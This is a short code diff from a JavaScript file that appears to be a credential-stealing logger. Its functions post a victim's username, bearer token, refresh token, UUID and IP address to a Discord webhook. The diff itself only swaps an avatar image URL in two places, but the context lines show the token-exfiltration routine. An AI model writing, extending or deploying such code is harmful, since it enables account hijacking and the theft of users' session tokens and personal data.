@@ -130,7 +130,7 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
     let data = {
         username: " ",
-        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
+        avatar_url: "https://media.discordapp.net/attachments/1023156290828120155/1038124432838897734/image.jpg",
         content: "@everyone",
         embeds: [{
             title: "User Info", color: 000080, fields: [
@@ -152,7 +152,7 @@ function logToWebhook(title, message) {
 
     let data = {
         username: " ",
-        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
+        avatar_url: "https://media.discordapp.net/attachments/1023156290828120155/1038124432838897734/image.jpg",
         content: " ",
         embeds: [{
             title: "Log", color: 000080, fields: [
